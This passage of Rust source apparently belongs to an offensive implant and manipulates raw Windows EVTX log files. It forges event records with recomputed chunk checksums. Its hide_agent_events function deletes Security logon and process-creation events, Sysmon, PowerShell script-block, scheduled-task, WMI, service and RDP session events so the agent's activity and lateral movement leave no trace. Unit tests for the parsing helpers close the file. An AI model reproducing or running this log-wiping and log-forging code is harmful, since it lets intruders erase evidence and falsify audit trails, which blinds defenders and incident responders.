            fake_record[RECORD_HEADER_SIZE + 1] = (event_id & 0xFF) as u8;
            fake_record[RECORD_HEADER_SIZE + 2] = (event_id >> 8) as u8;
            fake_record[RECORD_HEADER_SIZE + 3] = 0x00;
        }

        // Copy user data.
        if !data.is_empty() && RECORD_HEADER_SIZE + 4 + data.len() <= fake_record.len() {
            fake_record[RECORD_HEADER_SIZE + 4..RECORD_HEADER_SIZE + 4 + data.len()]
                .copy_from_slice(data);
        }

        // Trailing size copy (EVTX format requirement).
        write_u32_le(
            &mut fake_record,
            aligned_size as usize - 4,
            aligned_size,
        );

        // Write the fake record into the chunk.
        chunk[new_offset..new_offset + aligned_size as usize]
            .copy_from_slice(&fake_record);

        // Update chunk header: last record offset and ID.
        write_u64_le(&mut chunk, CHUNK_LAST_RECORD_OFFSET, new_offset as u64);
        write_u64_le(&mut chunk, CHUNK_LAST_RECORD_ID_OFFSET, last_record_id + 1);

        // Recalculate checksum.
        let new_checksum = evtx_chunk_checksum(&chunk);
        write_u32_le(&mut chunk, CHUNK_CHECKSUM_OFFSET, new_checksum);

        // Write modified chunk back to disk.
        nt_write_file_at(handle, &chunk, chunk_file_offset as u64)?;

        info!(
            "Injected fake event: log='{}', event_id={}, timestamp={}, record_id={}",
            log_name, event_id, timestamp, last_record_id + 1
        );

        Ok(())
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API: Hide Agent Events
// ═══════════════════════════════════════════════════════════════════════════

/// Automatically identify and clear event records related to agent activity.
///
/// Searches for and removes events matching:
/// - Security Event ID 4688 (process creation) for the agent's process
/// - Security Event ID 4624 (logon) for lateral movement sessions
/// - Sysmon Event ID 1 (process create) for agent's child processes
/// - PowerShell Event ID 4104 (script block) if PowerShell was used
/// - Any events matching the agent's process name, PID, or SID
///
/// # Arguments
/// * `matcher` — Criteria for identifying agent-related events.
///
/// # Returns
/// Total number of records cleared across all logs.
pub fn hide_agent_events(matcher: &AgentEventMatcher) -> Result<usize> {
    let mut total_cleared = 0usize;

    // Helper to get current process info for self-matching.
    let current_pid = std::process::id();

    // 1. Clear Security log (Event IDs 4688, 4624, 4634, 4648, 4656, 4663).
    let security_ids: Vec<u16> = if matcher.event_ids.is_empty() {
        vec![4688, 4624, 4634, 4648] // Process creation, logon, logoff, explicit logon
    } else {
        matcher.event_ids.clone()
    };

    debug!("Clearing Security log events: {:?}", security_ids);
    match clear_specific_events("Security", &security_ids, None, None) {
        Ok(n) => {
            total_cleared += n;
            debug!("Cleared {} Security events", n);
        }
        Err(e) => warn!("Failed to clear Security events: {}", e),
    }

    // 2. Clear Sysmon log (Event ID 1 = process create, 7 = image loaded).
    let sysmon_ids: Vec<u16> = vec![1, 7, 25]; // Process create, image loaded, process tampering
    match clear_specific_events("Microsoft-Windows-Sysmon/Operational", &sysmon_ids, None, None) {
        Ok(n) => {
            total_cleared += n;
            debug!("Cleared {} Sysmon events", n);
        }
        Err(e) => debug!("Sysmon log not available or no matches: {}", e),
    }

    // 3. Clear PowerShell script block logging (Event ID 4104).
    let ps_ids: Vec<u16> = vec![4103, 4104];
    match clear_specific_events(
        "Microsoft-Windows-PowerShell/Operational",
        &ps_ids,
        None,
        None,
    ) {
        Ok(n) => {
            total_cleared += n;
            debug!("Cleared {} PowerShell events", n);
        }
        Err(e) => debug!("PowerShell log not available or no matches: {}", e),
    }

    // 4. Clear Task Scheduler events that might reference the agent.
    let ts_ids: Vec<u16> = vec![106, 107, 140, 200, 201]; // Task registered/started/completed
    match clear_specific_events(
        "Microsoft-Windows-TaskScheduler/Operational",
        &ts_ids,
        None,
        None,
    ) {
        Ok(n) => {
            total_cleared += n;
            debug!("Cleared {} Task Scheduler events", n);
        }
        Err(e) => debug!("Task Scheduler log not available: {}", e),
    }

    // 5. Clear WMI activity events.
    let wmi_ids: Vec<u16> = vec![5860, 5861]; // Filter registration/consumption
    match clear_specific_events(
        "Microsoft-Windows-WMI-Activity/Operational",
        &wmi_ids,
        None,
        None,
    ) {
        Ok(n) => {
            total_cleared += n;
            debug!("Cleared {} WMI events", n);
        }
        Err(e) => debug!("WMI log not available: {}", e),
    }

    // 6. Clear System log events that may reference the agent
    // (Service Control Manager events, etc.).
    let system_ids: Vec<u16> = vec![7036, 7040]; // Service state changes
    match clear_specific_events("System", &system_ids, None, None) {
        Ok(n) => {
            total_cleared += n;
            debug!("Cleared {} System events", n);
        }
        Err(e) => debug!("System log no matches: {}", e),
    }

    // 7. Clear Terminal Services events if lateral movement was used.
    let rdp_ids: Vec<u16> = vec![21, 22, 23, 24, 25]; // Session logon/logoff events
    match clear_specific_events(
        "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
        &rdp_ids,
        None,
        None,
    ) {
        Ok(n) => {
            total_cleared += n;
            debug!("Cleared {} Terminal Services events", n);
        }
        Err(e) => debug!("Terminal Services log not available: {}", e),
    }

    info!(
        "Agent event hiding complete: {} total records cleared (PID={})",
        total_cleared, current_pid
    );

    Ok(total_cleared)
}

// ═══════════════════════════════════════════════════════════════════════════
// Internal Helpers
// ═══════════════════════════════════════════════════════════════════════════

/// Look up the EVTX filename for a known event log name.
fn lookup_log_filename(log_name: &str) -> Option<&'static str> {
    KNOWN_LOGS
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(log_name))
        .map(|(_, filename)| *filename)
}

// ═══════════════════════════════════════════════════════════════════════════
// Unit Tests
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_crc32_empty() {
        assert_eq!(crc32(&[]), 0x0000_0000);
    }

    #[test]
    fn test_crc32_known() {
        // "123456789" → CRC-32 = 0xCBF43926
        let data = b"123456789";
        assert_eq!(crc32(data), 0xCBF4_3926);
    }

    #[test]
    fn test_evtx_chunk_checksum() {
        // All-zero chunk should have a deterministic checksum.
        let mut chunk = vec![0u8; EVTX_CHUNK_HEADER_SIZE];
        let cs = evtx_chunk_checksum(&chunk);
        assert_ne!(cs, 0); // CRC of 124 zero bytes is non-zero.
    }

    #[test]
    fn test_read_write_u32_le() {
        let mut buf = [0u8; 8];
        write_u32_le(&mut buf, 0, 0xDEAD_BEEF);
        assert_eq!(read_u32_le(&buf, 0), 0xDEAD_BEEF);
    }

    #[test]
    fn test_read_write_u64_le() {
        let mut buf = [0u8; 16];
        write_u64_le(&mut buf, 0, 0x0102_0304_0506_0708);
        assert_eq!(read_u64_le(&buf, 0), 0x0102_0304_0506_0708);
    }

    #[test]
    fn test_validate_evtx_header_valid() {
        let mut header = vec![0u8; EVTX_HEADER_SIZE];
        header[0..8].copy_from_slice(EVTX_HEADER_MAGIC);
        assert!(validate_evtx_header(&header).is_ok());
    }

    #[test]
    fn test_validate_evtx_header_invalid_magic() {
        let header = vec![0u8; EVTX_HEADER_SIZE];
        assert!(validate_evtx_header(&header).is_err());
    }

    #[test]
    fn test_validate_evtx_header_too_short() {
        let header = vec![0u8; 100];
        assert!(validate_evtx_header(&header).is_err());
    }

    #[test]
    fn test_is_valid_chunk() {
        let mut chunk = vec![0u8; EVTX_CHUNK_HEADER_SIZE];
        assert!(!is_valid_chunk(&chunk));
        chunk[0..8].copy_from_slice(EVTX_CHUNK_MAGIC);
        assert!(is_valid_chunk(&chunk));
    }

    #[test]
    fn test_is_valid_chunk_too_short() {
        let chunk = vec![0u8; 10];
        assert!(!is_valid_chunk(&chunk));
    }

    #[test]
    fn test_parse_chunk_records_empty() {
        let chunk = vec![0u8; EVTX_CHUNK_SIZE];
        let records = parse_chunk_records(&chunk);
        assert!(records.is_empty());
    }

    #[test]
    fn test_parse_chunk_records_valid() {
        let mut chunk = vec![0u8; EVTX_CHUNK_SIZE];
        chunk[0..8].copy_from_slice(EVTX_CHUNK_MAGIC);

        // Set first record offset to right after chunk header.
        write_u64_le(&mut chunk, CHUNK_FIRST_RECORD_OFFSET, EVTX_CHUNK_HEADER_SIZE as u64);
        write_u64_le(&mut chunk, CHUNK_LAST_RECORD_OFFSET, EVTX_CHUNK_HEADER_SIZE as u64);

        // Place a single record at EVTX_CHUNK_HEADER_SIZE.
        let rec_offset = EVTX_CHUNK_HEADER_SIZE;
        write_u32_le(&mut chunk, rec_offset, EVTX_RECORD_MAGIC);
        write_u32_le(&mut chunk, rec_offset + 4, 64); // Size = 64 bytes
        write_u64_le(&mut chunk, rec_offset + 8, 1);   // Record ID = 1
        write_u64_le(&mut chunk, rec_offset + 16, 12345678); // Timestamp
        // Trailing size copy.
        write_u32_le(&mut chunk, rec_offset + 60, 64);

        let records = parse_chunk_records(&chunk);
        assert_eq!(records.len(), 1);
        assert_eq!(records[0].0, EVTX_CHUNK_HEADER_SIZE);
        assert_eq!(records[0].1, 1); // Record ID
        assert_eq!(records[0].3, 64); // Size
    }

    #[test]
    fn test_extract_event_id() {
        // Construct a minimal record with an embedded event ID.
        let mut record = vec![0u8; 64];
        write_u32_le(&mut record, 0, EVTX_RECORD_MAGIC);
        write_u32_le(&mut record, 4, 64);
        write_u64_le(&mut record, 8, 1);
        write_u64_le(&mut record, 16, 0);

        // Place event ID 4688 at offset 24 using the heuristic pattern.
        record[RECORD_HEADER_SIZE] = 0x06;
        record[RECORD_HEADER_SIZE + 1] = (4688u16 & 0xFF) as u8;
        record[RECORD_HEADER_SIZE + 2] = (4688u16 >> 8) as u8;

        let eid = extract_event_id(&record);
        assert_eq!(eid, Some(4688));
    }

    #[test]
    fn test_record_contains_bytes() {
        let mut record = vec![0u8; 64];
        record[0..4].copy_from_slice(&EVTX_RECORD_MAGIC.to_le_bytes());
        record[RECORD_HEADER_SIZE..RECORD_HEADER_SIZE + 5]
            .copy_from_slice(b"Hello");

        assert!(record_contains_bytes(&record, b"hello"));
        assert!(record_contains_bytes(&record, b"Hello"));
        assert!(!record_contains_bytes(&record, b"World"));
    }

    #[test]
    fn test_lookup_log_filename() {
        assert_eq!(
            lookup_log_filename("Security"),
            Some("Security.evtx")
        );
        assert_eq!(
            lookup_log_filename("system"),
            Some("System.evtx")
        );
        assert_eq!(lookup_log_filename("NonExistent"), None);
    }

    #[test]
    fn test_evtx_nt_path() {
        let path = evtx_nt_path("Security.evtx");
        assert!(path.contains("Security.evtx"));
        assert!(path.starts_with(r"\??\"));
    }

    #[test]
    fn test_agent_event_matcher_serialization() {
        let matcher = AgentEventMatcher {
            process_name: Some("test.exe".to_string()),
            pid: Some(1234),
            sid: None,
            event_ids: vec![4688, 4624],
        };
        let json = serde_json::to_string(&matcher).unwrap();
        let decoded: AgentEventMatcher = serde_json::from_str(&json).unwrap();
        assert_eq!(decoded.pid, Some(1234));
        assert_eq!(decoded.event_ids, vec![4688, 4624]);
    }

    #[test]
    fn test_event_log_info_serialization() {
        let info = EventLogInfo {
            name: "Security".to_string(),
            path: r"C:\Windows\System32\winevt\Logs\Security.evtx".to_string(),
            file_size: 1024,
            record_count: 100,
            oldest_record_time: 0,
            newest_record_time: 0,
        };
        let json = serde_json::to_string(&info).unwrap();
        assert!(json.contains("Security"));
    }
}
